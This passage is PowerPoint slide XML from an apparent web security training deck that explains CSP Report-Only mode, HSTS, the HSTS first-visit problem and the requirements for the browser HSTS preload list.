              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>does not block</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> – it only reports what </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>would</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> have been blocked.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>It gives you a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>“dry-run” CSP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> over real production traffic.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="193930532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901B-A8B6-39DD-7169-B699EA41F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E3038-30CA-AEA6-862A-D145FBFE0B23}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Why use CSP Report-Only?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0B599B74-E71B-901E-C52D-3D4AD388147B}"/>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lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>You will break things</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> with your first strict CSP.</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Third-party scripts,</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Browser extensions,</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Old inline event handlers.</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endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Report-only lets you iterate safely.</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Deploy candidate CSP in Report-Only.</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Collect reports &amp; logs.</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Adjust whitelists, nonces, and hashes.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900"/>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Aptos" panose="020B0004020202020204"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="95755058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231C-4DD0-4379-4BBF-B80D64FE1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28163-6A73-1F1B-9FD1-43F3366DC8CA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Why use CSP Report-Only?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B641A99B-03EA-9307-1D20-154BDBC848DA}"/>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lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>You will break things</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> with your first strict CSP.</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Third-party scripts,</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Browser extensions,</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pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Old inline event handlers.</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endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Report-only lets you iterate safely.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">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Deploy candidate CSP in Report-Only.</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Collect reports &amp; logs.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial,Sans-Serif" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Adjust whitelists, nonces, and hashes.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900"/>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Aptos" panose="020B0004020202020204"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="26983760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AC96-831A-C0F0-F080-90CA576B9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E0877-FC6E-5A63-9CE2-90C0ED6DB1AE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>HSTS Overview</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C9075B5F-7B45-286D-6B2C-1799920A8F67}"/>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buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>HSTS (HTTP Strict Transport Security)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> is an HTTP response header that mandates compatible browsers to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>only talk to your site over HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, never over HTTP, for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>N</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> seconds.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="400400344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FB8A-328C-BBEF-C0E1-78ACE6B71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E828B-11A9-D4AD-F7EF-70F2C0CDC594}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>HSTS Overview</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5ACCA126-1344-0C54-A7CD-FDAE738422AC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="8723136" cy="4391667"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>HSTS (HTTP Strict Transport Security)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> is an HTTP response header that mandates compatible browsers to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>only talk to your site over HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, never over HTTP, for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>N</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> seconds.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="352356784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5810-62B9-9E1C-23EA-E6F194BFD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DF3A2-7FE0-5981-2D5A-53171AA899B1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>HSTS 'first visit' problem</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DC7F6B17-0EA2-186B-FFE5-9CE12367A43E}"/>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dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>If the first contact is </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="Aptos"/>
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>http://example.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>and you don’t already have HSTS, an attacker can strip the redirect </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>before</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> the browser learns about HSTS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="160896332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7A8C4-1782-EFFE-3106-F513C0D3C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E5CE8-A270-0C5B-6C7E-ED606A1C0571}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>HSTS preload</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A3309690-253F-A9DA-5A1D-2182A803CEDE}"/>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dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>To mitigate the 'first visit' issue, major browsers ship with a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>built-in HSTS preload list</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>A static list of domains known to be HTTPS-only.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>For those domains, the browser behaves as if they </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>already sent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> a strict HSTS policy, even on the very first visit.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="Aptos"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="130760635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DE5D8-3903-6403-8F73-1F2ACC040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546F3-7CAB-926A-E7CD-ABE6E0E9D72E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Applying for HSTS preload</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5D83DDC0-9F45-90C4-8EF6-F12E7F4ED8C4}"/>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dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>To get on the preload list (chrome-based standard), your site typically must:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Serve a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>valid HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> configuration.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Send an HSTS header with:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-285750">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>max-age &gt;= 31536000</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> (1 year),</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-285750">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" err="1">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>includeSubDomains</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-285750">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>preload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Redirect all HTTP → HTTPS.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Submit your domain at a preload service (commonly hstspreload.org).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
